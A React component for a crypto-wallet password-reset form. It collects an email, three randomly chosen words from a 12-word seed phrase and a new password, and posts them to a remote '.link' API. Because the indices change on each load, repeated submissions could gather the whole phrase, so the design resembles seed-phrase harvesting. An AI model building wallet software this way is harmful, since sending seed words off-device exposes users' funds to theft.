import React, { useState } from 'react';
import axios from 'axios';
import { toast } from 'react-toastify';
import { useTranslation } from 'react-i18next';

function ResetPassword({ setView }) {
  const { t } = useTranslation();

  const [email, setEmail] = useState('');
  const [wordIndices] = useState(() => generateUniqueWordIndices());
  const [words, setWords] = useState(['', '', '']);
  const [newPassword, setNewPassword] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  function generateUniqueWordIndices() {
    const indices = new Set();
    while (indices.size < 3) {
      indices.add(Math.floor(Math.random() * 12));
    }
    return Array.from(indices);
  }

  const validatePassword = (password) => {
    const passwordRegex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*#?&])[A-Za-z\d@$!%*#?&]{8,}$/;
    return passwordRegex.test(password);
  };

  const handleReset = async () => {
    if (!email) {
      toast.error(t('resetPassword.validateEmailError'));
      return;
    }

    if (words.some((word) => !word)) {
      toast.error(t('resetPassword.validateSeedWordsError'));
      return;
    }

    if (!newPassword) {
      toast.error(t('resetPassword.validateNewPasswordError'));
      return;
    }

    if (!validatePassword(newPassword)) {
      toast.error(t('resetPassword.validateNewPasswordFormatError'));
      return;
    }

    try {
      setIsSubmitting(true);
      toast.info(t('resetPassword.requestToast'));

      await axios.post('https://ifehuadmwallet.link/wallet-api/api/reset-password', {
        email,
        wordIndices,
        words,
        newPassword,
      });

      toast.success(t('resetPassword.successToast'));

      setTimeout(() => {
        setView('home');
      }, 3000);
    } catch (error) {
      console.error(t('resetPassword.errorResetPassword'), error);
      if (error.response?.data?.message) {
        toast.error(`${t('resetPassword.errorPrefix')}${error.response.data.message}`);
      } else {
        toast.error(t('resetPassword.errorResetPassword'));
      }
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="w-full max-w-3xl bg-white rounded-lg shadow-lg p-6">
      <h2 className="text-2xl font-semibold mb-6">
        {t('resetPassword.title')}
      </h2>

      <div className="mb-4">
        <label htmlFor="email" className="block text-gray-700 font-medium mb-1">
          {t('resetPassword.emailLabel')}
        </label>
        <input
          id="email"
          type="email"
          placeholder={t('resetPassword.emailPlaceholder')}
          value={email}
          onChange={(e) => setEmail(e.target.value)}
          className="w-full border border-gray-300 rounded px-3 py-2
                     focus:outline-none focus:ring-2 focus:ring-lime-500"
        />
      </div>
      <p className="text-gray-700 mb-4">
        {
          t('resetPassword.seedHint', {
            indices: wordIndices.map((index) => index + 1).join(', ')
          })
        }
      </p>
      <div className="grid grid-cols-2 gap-4 mb-6">
        <div>
          <label
            htmlFor="word-0"
            className="block text-gray-700 font-medium mb-1"
          >
            {t('resetPassword.wordLabel')} {wordIndices[0] + 1}
          </label>
          <input
            id="word-0"
            type="text"
            placeholder={`${t('resetPassword.wordPlaceholder')} ${wordIndices[0] + 1}`}
            value={words[0]}
            onChange={(e) => {
              const newWords = [...words];
              newWords[0] = e.target.value.trim();
              setWords(newWords);
            }}
            className="w-full border border-gray-300 rounded px-3 py-2
                       focus:outline-none focus:ring-2 focus:ring-lime-500"
          />
        </div>
        <div>
          <label
            htmlFor="word-1"
            className="block text-gray-700 font-medium mb-1"
          >
            {t('resetPassword.wordLabel')} {wordIndices[1] + 1}
          </label>
          <input
            id="word-1"
            type="text"
            placeholder={`${t('resetPassword.wordPlaceholder')} ${wordIndices[1] + 1}`}
            value={words[1]}
            onChange={(e) => {
              const newWords = [...words];
              newWords[1] = e.target.value.trim();
              setWords(newWords);
            }}
            className="w-full border border-gray-300 rounded px-3 py-2
                       focus:outline-none focus:ring-2 focus:ring-lime-500"
          />
        </div>
        <div>
          <label
            htmlFor="word-2"
            className="block text-gray-700 font-medium mb-1"
          >
            {t('resetPassword.wordLabel')} {wordIndices[2] + 1}
          </label>
          <input
            id="word-2"
            type="text"
            placeholder={`${t('resetPassword.wordPlaceholder')} ${wordIndices[2] + 1}`}
            value={words[2]}
            onChange={(e) => {
              const newWords = [...words];
              newWords[2] = e.target.value.trim();
              setWords(newWords);
            }}
            className="w-full border border-gray-300 rounded px-3 py-2
                       focus:outline-none focus:ring-2 focus:ring-lime-500"
          />
        </div>
        <div>
          <label
            htmlFor="newPassword"
            className="block text-gray-700 font-medium mb-1"
          >
            {t('resetPassword.newPasswordLabel')}
          </label>
          <input
            id="newPassword"
            type="password"
            placeholder={t('resetPassword.newPasswordPlaceholder')}
            value={newPassword}
            onChange={(e) => setNewPassword(e.target.value)}
            className="w-full border border-gray-300 rounded px-3 py-2
                       focus:outline-none focus:ring-2 focus:ring-lime-500"
          />
        </div>
      </div>
      <div className="flex space-x-4">
        <button
          onClick={handleReset}
          disabled={isSubmitting}
          className={`
            px-6 py-3 rounded text-white font-medium
            bg-lime-500 hover:bg-lime-600 transition duration-200
            ${isSubmitting ? 'opacity-50 cursor-not-allowed' : ''}
          `}
        >
          {isSubmitting ? t('resetPassword.resetButtonSubmitting') : t('resetPassword.resetButtonIdle')}
        </button>

        <button
          onClick={() => setView('home')}
          className="px-6 py-3 rounded font-medium text-white 
                     bg-gray-900 hover:bg-gray-800 transition duration-200"
        >
          {t('resetPassword.backHome')}
        </button>
      </div>
    </div>
  );
}

export default ResetPassword;
